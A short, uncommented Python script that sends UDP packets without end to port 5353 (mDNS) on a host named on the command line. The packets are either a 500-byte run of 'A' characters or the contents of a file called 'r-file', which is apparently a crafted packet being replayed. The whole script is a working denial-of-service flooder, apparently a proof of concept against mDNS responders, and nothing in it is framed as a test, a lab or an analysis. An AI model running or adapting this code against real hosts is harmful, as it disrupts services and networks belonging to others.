import socket
import sys


def send(host, content):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(content, (host, 5353))

if sys.argv[1] == '-n':
    random = b'A' * 500

    while True:
        send(sys.argv[2], random)

else:
    with open('r-file', 'rb') as r:
        c = r.read()

    while True:
        send(sys.argv[1], c)
